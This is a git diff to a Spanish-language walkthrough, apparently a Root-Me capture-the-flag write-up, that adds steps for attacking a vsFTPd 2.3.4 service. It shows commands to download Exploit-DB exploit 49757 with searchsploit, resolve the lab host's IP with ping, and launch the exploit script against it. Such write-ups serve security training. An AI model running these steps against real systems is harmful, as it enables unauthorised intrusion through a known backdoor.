@@ -40,6 +40,27 @@ searchsploit vsFTPd 2.3.4
 ```
 ![3](https://user-images.githubusercontent.com/75953873/172518879-12b95d54-5dac-4f0d-918e-96860c1c5eed.png)
 
-`Dato:` cada exploit esta enumerado y es irrepetible.
+`Dato:` cada exploit está enumerado y es irrepetible.
 
 Exploit: 49757
+
+Descargar exploit:
+```
+searchsploit -m 49757
+```
+![4](https://user-images.githubusercontent.com/75953873/172519207-132d9579-e008-4980-941a-44925d69d383.png)
+
+- *Paso 5:* Obtener acceso. 
+
+Obtener IP de la máquina a través de un ping:
+```
+ping -c 2 ctf04.root-me.org
+```
+![5](https://user-images.githubusercontent.com/75953873/172519517-52e00c2d-277e-43d7-838e-796e99e2ed34.png)
+
+IP: 212.129.29.186
+
+Ejecución del exploit:
+```
+python3 49757.py 212.129.29.186
+```
